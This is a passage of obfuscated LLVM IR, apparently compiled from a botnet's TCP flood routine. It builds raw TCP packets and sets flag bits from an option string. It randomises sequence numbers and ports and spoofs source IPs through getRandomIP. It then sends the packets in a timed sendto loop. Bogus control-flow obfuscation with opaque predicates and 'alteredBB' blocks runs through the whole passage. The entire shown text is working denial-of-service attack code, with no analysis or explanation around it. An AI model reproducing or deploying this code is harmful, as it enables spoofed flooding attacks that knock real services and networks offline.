  %142 = bitcast %union.anon* %141 to %struct.anon.0*
  %143 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %142, i32 0, i32 0
  store i16 %139, i16* %143, align 4
  %144 = call i32 @rand_cmwc()
  %145 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon* %146 to %struct.anon.0*
  %148 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %147, i32 0, i32 2
  store i32 %144, i32* %148, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 3
  store i32 0, i32* %152, align 4
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon* %154 to %struct.anon.0*
  %156 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %155, i32 0, i32 4
  %157 = load i16, i16* %156, align 4
  %158 = and i16 %157, -241
  %159 = or i16 %158, 80
  store i16 %159, i16* %156, align 4
  %160 = load i8*, i8** %11, align 8
  %161 = call i32 @strcmp(i8* %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #9
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %199, label %163

; <label>:163:                                    ; preds = %116
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon* %165 to %struct.anon.0*
  %167 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %166, i32 0, i32 4
  %168 = load i16, i16* %167, align 4
  %169 = and i16 %168, -513
  %170 = or i16 %169, 512
  store i16 %170, i16* %167, align 4
  %171 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %172 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %171, i32 0, i32 0
  %173 = bitcast %union.anon* %172 to %struct.anon.0*
  %174 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %173, i32 0, i32 4
  %175 = load i16, i16* %174, align 4
  %176 = and i16 %175, -1025
  %177 = or i16 %176, 1024
  store i16 %177, i16* %174, align 4
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon* %179 to %struct.anon.0*
  %181 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -257
  %184 = or i16 %183, 256
  store i16 %184, i16* %181, align 4
  %185 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon* %186 to %struct.anon.0*
  %188 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = and i16 %189, -4097
  %191 = or i16 %190, 4096
  store i16 %191, i16* %188, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon* %193 to %struct.anon.0*
  %195 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = and i16 %196, -2049
  %198 = or i16 %197, 2048
  store i16 %198, i16* %195, align 4
  br label %401

; <label>:199:                                    ; preds = %116
  %200 = load i8*, i8** %11, align 8
  %201 = call i8* @strtok(i8* %200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0)) #5
  store i8* %201, i8** %23, align 8
  br label %202

; <label>:202:                                    ; preds = %originalBBpart256, %199
  %203 = load i32, i32* @x.67
  %204 = load i32, i32* @y.68
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %202
  %211 = load i8*, i8** %23, align 8
  %212 = icmp ne i8* %211, null
  %213 = load i32, i32* @x.67
  %214 = load i32, i32* @y.68
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %212, label %221, label %384

; <label>:221:                                    ; preds = %originalBBpart212
  %222 = load i8*, i8** %23, align 8
  %223 = call i32 @strcmp(i8* %222, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.104, i32 0, i32 0)) #9
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %249, label %225

; <label>:225:                                    ; preds = %221
  %226 = load i32, i32* @x.67
  %227 = load i32, i32* @y.68
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %225
  %234 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon* %235 to %struct.anon.0*
  %237 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %238, -513
  %240 = or i16 %239, 512
  store i16 %240, i16* %237, align 4
  %241 = load i32, i32* @x.67
  %242 = load i32, i32* @y.68
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart224, label %originalBB14alteredBB

originalBBpart224:                                ; preds = %originalBB14
  br label %366

; <label>:249:                                    ; preds = %221
  %250 = load i32, i32* @x.67
  %251 = load i32, i32* @y.68
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %249
  %258 = load i8*, i8** %23, align 8
  %259 = call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #9
  %260 = icmp ne i32 %259, 0
  %261 = load i32, i32* @x.67
  %262 = load i32, i32* @y.68
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %260, label %277, label %269

; <label>:269:                                    ; preds = %originalBBpart228
  %270 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon* %271 to %struct.anon.0*
  %273 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %274, -1025
  %276 = or i16 %275, 1024
  store i16 %276, i16* %273, align 4
  br label %349

; <label>:277:                                    ; preds = %originalBBpart228
  %278 = load i8*, i8** %23, align 8
  %279 = call i32 @strcmp(i8* %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0)) #9
  %280 = icmp ne i32 %279, 0
  br i1 %280, label %305, label %281

; <label>:281:                                    ; preds = %277
  %282 = load i32, i32* @x.67
  %283 = load i32, i32* @y.68
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %281
  %290 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon* %291 to %struct.anon.0*
  %293 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %294, -257
  %296 = or i16 %295, 256
  store i16 %296, i16* %293, align 4
  %297 = load i32, i32* @x.67
  %298 = load i32, i32* @y.68
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart244, label %originalBB30alteredBB

originalBBpart244:                                ; preds = %originalBB30
  br label %348

; <label>:305:                                    ; preds = %277
  %306 = load i8*, i8** %23, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #9
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %317, label %309

; <label>:309:                                    ; preds = %305
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = and i16 %314, -4097
  %316 = or i16 %315, 4096
  store i16 %316, i16* %313, align 4
  br label %347

; <label>:317:                                    ; preds = %305
  %318 = load i32, i32* @x.67
  %319 = load i32, i32* @y.68
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %317
  %326 = load i8*, i8** %23, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %328 = icmp ne i32 %327, 0
  %329 = load i32, i32* @x.67
  %330 = load i32, i32* @y.68
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %328, label %345, label %337

; <label>:337:                                    ; preds = %originalBBpart248
  %338 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 0
  %340 = bitcast %union.anon* %339 to %struct.anon.0*
  %341 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = and i16 %342, -2049
  %344 = or i16 %343, 2048
  store i16 %344, i16* %341, align 4
  br label %346

; <label>:345:                                    ; preds = %originalBBpart248
  br label %346

; <label>:346:                                    ; preds = %345, %337
  br label %347

; <label>:347:                                    ; preds = %346, %309
  br label %348

; <label>:348:                                    ; preds = %347, %originalBBpart244
  br label %349

; <label>:349:                                    ; preds = %348, %269
  %350 = load i32, i32* @x.67
  %351 = load i32, i32* @y.68
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %349
  %358 = load i32, i32* @x.67
  %359 = load i32, i32* @y.68
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %366

; <label>:366:                                    ; preds = %originalBBpart252, %originalBBpart224
  %367 = load i32, i32* @x.67
  %368 = load i32, i32* @y.68
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %366
  %375 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %375, i8** %23, align 8
  %376 = load i32, i32* @x.67
  %377 = load i32, i32* @y.68
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %202

; <label>:384:                                    ; preds = %originalBBpart212
  %385 = load i32, i32* @x.67
  %386 = load i32, i32* @y.68
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %384
  %393 = load i32, i32* @x.67
  %394 = load i32, i32* @y.68
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %401

; <label>:401:                                    ; preds = %originalBBpart260, %163
  %402 = load i32, i32* @x.67
  %403 = load i32, i32* @y.68
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %401
  %410 = call i32 @rand_cmwc()
  %411 = trunc i32 %410 to i16
  %412 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon* %413 to %struct.anon.0*
  %415 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %414, i32 0, i32 5
  store i16 %411, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  %418 = bitcast %union.anon* %417 to %struct.anon.0*
  %419 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %418, i32 0, i32 6
  store i16 0, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon* %421 to %struct.anon.0*
  %423 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %422, i32 0, i32 7
  store i16 0, i16* %423, align 2
  %424 = load i32, i32* %9, align 4
  %425 = icmp eq i32 %424, 0
  %426 = load i32, i32* @x.67
  %427 = load i32, i32* @y.68
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %425, label %434, label %436

; <label>:434:                                    ; preds = %originalBBpart264
  %435 = call i32 @rand_cmwc()
  br label %441

; <label>:436:                                    ; preds = %originalBBpart264
  %437 = load i32, i32* %9, align 4
  %438 = trunc i32 %437 to i16
  %439 = call zeroext i16 @htons(i16 zeroext %438) #10
  %440 = zext i16 %439 to i32
  br label %441

; <label>:441:                                    ; preds = %436, %434
  %442 = phi i32 [ %435, %434 ], [ %440, %436 ]
  %443 = trunc i32 %442 to i16
  %444 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 0
  %446 = bitcast %union.anon* %445 to %struct.anon.0*
  %447 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %446, i32 0, i32 1
  store i16 %443, i16* %447, align 2
  %448 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %449 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %450 = call zeroext i16 @tcpcsum(%struct.iphdr* %448, %struct.tcphdr* %449)
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 6
  store i16 %450, i16* %454, align 4
  %455 = bitcast i8* %121 to i16*
  %456 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = call zeroext i16 @csum(i16* %455, i32 %459)
  %461 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = call i64 @time(i64* null) #5
  %464 = load i32, i32* %10, align 4
  %465 = sext i32 %464 to i64
  %466 = add nsw i64 %463, %465
  %467 = trunc i64 %466 to i32
  store i32 %467, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %468

; <label>:468:                                    ; preds = %originalBBpart287, %553, %441
  br label %469

; <label>:469:                                    ; preds = %468
  %470 = load i32, i32* @x.67
  %471 = load i32, i32* @y.68
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %469
  %478 = load i32, i32* %17, align 4
  %479 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %480 = call i64 @sendto(i32 %478, i8* %121, i64 %119, i32 0, %struct.sockaddr* %479, i32 16)
  %481 = load i32, i32* %19, align 4
  %482 = call i32 @getRandomIP(i32 %481)
  %483 = call i32 @htonl(i32 %482) #10
  %484 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 8
  store i32 %483, i32* %485, align 4
  %486 = call i32 @rand_cmwc()
  %487 = trunc i32 %486 to i16
  %488 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 3
  store i16 %487, i16* %489, align 4
  %490 = call i32 @rand_cmwc()
  %491 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %492 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %491, i32 0, i32 0
  %493 = bitcast %union.anon* %492 to %struct.anon.0*
  %494 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %493, i32 0, i32 2
  store i32 %490, i32* %494, align 4
  %495 = call i32 @rand_cmwc()
  %496 = trunc i32 %495 to i16
  %497 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %498 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %497, i32 0, i32 0
  %499 = bitcast %union.anon* %498 to %struct.anon.0*
  %500 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %499, i32 0, i32 0
  store i16 %496, i16* %500, align 4
  %501 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %502 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %501, i32 0, i32 0
  %503 = bitcast %union.anon* %502 to %struct.anon.0*
  %504 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %503, i32 0, i32 6
  store i16 0, i16* %504, align 4
  %505 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %506 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %507 = call zeroext i16 @tcpcsum(%struct.iphdr* %505, %struct.tcphdr* %506)
  %508 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %509 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %508, i32 0, i32 0
  %510 = bitcast %union.anon* %509 to %struct.anon.0*
  %511 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %510, i32 0, i32 6
  store i16 %507, i16* %511, align 4
  %512 = bitcast i8* %121 to i16*
  %513 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 2
  %515 = load i16, i16* %514, align 2
  %516 = zext i16 %515 to i32
  %517 = call zeroext i16 @csum(i16* %512, i32 %516)
  %518 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 7
  store i16 %517, i16* %519, align 2
  %520 = load i32, i32* %25, align 4
  %521 = load i32, i32* %15, align 4
  %522 = icmp eq i32 %520, %521
  %523 = load i32, i32* @x.67
  %524 = load i32, i32* @y.68
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %522, label %531, label %554

; <label>:531:                                    ; preds = %originalBBpart268
  %532 = call i64 @time(i64* null) #5
  %533 = load i32, i32* %24, align 4
  %534 = sext i32 %533 to i64
  %535 = icmp sgt i64 %532, %534
  br i1 %535, label %536, label %553

; <label>:536:                                    ; preds = %531
  %537 = load i32, i32* @x.67
  %538 = load i32, i32* @y.68
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %536
  %545 = load i32, i32* @x.67
  %546 = load i32, i32* @y.68
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %573

; <label>:553:                                    ; preds = %531
  store i32 0, i32* %25, align 4
  br label %468

; <label>:554:                                    ; preds = %originalBBpart268
  %555 = load i32, i32* @x.67
  %556 = load i32, i32* @y.68
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %554
  %563 = load i32, i32* %25, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %25, align 4
  %565 = load i32, i32* @x.67
  %566 = load i32, i32* @y.68
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBBpart287, label %originalBB74alteredBB

originalBBpart287:                                ; preds = %originalBB74
  br label %468

; <label>:573:                                    ; preds = %originalBBpart272
  %574 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %574)
  br label %575

; <label>:575:                                    ; preds = %573, %105, %originalBBpart24, %60
  %576 = load i32, i32* @x.67
  %577 = load i32, i32* @y.68
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %575
  %584 = load i32, i32* @x.67
  %585 = load i32, i32* @y.68
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %592 = load i32, i32* %9, align 4
  %593 = trunc i32 %592 to i16
  %594 = call zeroext i16 @htons(i16 zeroext %593) #10
  %595 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %594, i16* %595, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  store i32 1, i32* %18, align 4
  %596 = load i32, i32* %17, align 4
  %597 = bitcast i32* %18 to i8*
  %598 = call i32 @setsockopt(i32 %596, i32 0, i32 3, i8* %597, i32 4) #5
  %599 = icmp slt i32 %598, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %202
  %600 = load i8*, i8** %23, align 8
  %601 = icmp ne i8* %600, null
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %225
  %602 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 0
  %604 = bitcast %union.anon* %603 to %struct.anon.0*
  %605 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %604, i32 0, i32 4
  %606 = load i16, i16* %605, align 4
  %_ = sub i16 0, %606
  %gen = add i16 %_, -513
  %_15 = shl i16 %606, -513
  %_16 = sub i16 0, %606
  %gen17 = add i16 %_16, -513
  %_18 = sub i16 0, %606
  %gen19 = add i16 %_18, -513
  %607 = and i16 %606, -513
  %_20 = shl i16 %607, 512
  %_21 = shl i16 %607, 512
  %_22 = shl i16 %607, 512
  %608 = or i16 %607, 512
  store i16 %608, i16* %605, align 4
  br label %originalBB14

originalBB26alteredBB:                            ; preds = %originalBB26, %249
  %609 = load i8*, i8** %23, align 8
  %610 = call i32 @strcmp(i8* %609, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #9
  %611 = icmp ne i32 %610, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %281
  %612 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 0
  %614 = bitcast %union.anon* %613 to %struct.anon.0*
  %615 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %614, i32 0, i32 4
  %616 = load i16, i16* %615, align 4
  %_31 = shl i16 %616, -257
  %_32 = sub i16 %616, -257
  %gen33 = mul i16 %_32, -257
  %_34 = sub i16 %616, -257
  %gen35 = mul i16 %_34, -257
  %_36 = sub i16 %616, -257
  %gen37 = mul i16 %_36, -257
  %_38 = sub i16 0, %616
  %gen39 = add i16 %_38, -257
  %617 = and i16 %616, -257
  %_40 = shl i16 %617, 256
  %_41 = sub i16 %617, 256
  %gen42 = mul i16 %_41, 256
  %618 = or i16 %617, 256
  store i16 %618, i16* %615, align 4
  br label %originalBB30

originalBB46alteredBB:                            ; preds = %originalBB46, %317
  %619 = load i8*, i8** %23, align 8
  %620 = call i32 @strcmp(i8* %619, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %621 = icmp ne i32 %620, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %349
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %366
  %622 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %622, i8** %23, align 8
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %384
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %401
  %623 = call i32 @rand_cmwc()
